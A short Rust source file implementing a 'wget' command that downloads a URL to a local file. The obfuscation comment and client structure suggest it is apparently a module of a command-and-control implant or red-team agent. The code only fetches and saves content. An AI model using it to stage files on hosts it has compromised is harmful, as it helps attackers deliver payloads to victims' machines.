use crate::internal::client::Client;
use fmtools::format; // using obfstr to obfuscate
use std::fs::File;
use std::io::Write;

pub(crate) fn wget(args: &[String], client: &Client) -> String {
    let (url, filename) = match args.len() {
        1 if !args[0].is_empty() => {
            let url = &args[0];
            let filename = format!({std::env::current_dir().unwrap().display()}"/"{url.split('/').last().unwrap()}".html");
            (url, filename)
        }
        n if n >= 2 => {
            let url = &args[0];
            let filename = args[1..].join(" ");
            (url, filename)
        }
        _ => {
            return format!(
                "Invalid number of arguments received. Usage: 'wget [URL] <optional: path>'."
            )
        }
    };

    let response = ureq::get(url).set("User-Agent", &client.user_agent).call();

    if let Ok(res) = response {
        if let Ok(body) = res.into_string() {
            let Ok(mut file) = File::create(&filename) else {
                return format!("Unable to create file: "{filename});
            };

            if file.write_all(body.as_bytes()).is_err() {
                return format!("Unable to write data to file: "{filename});
            }

            format!("Downloaded file from '"{url}"' to '"{filename}"'.")
        } else {
            format!("Failed to read response body.")
        }
    } else {
        format!("Failed to send request.")
    }
}
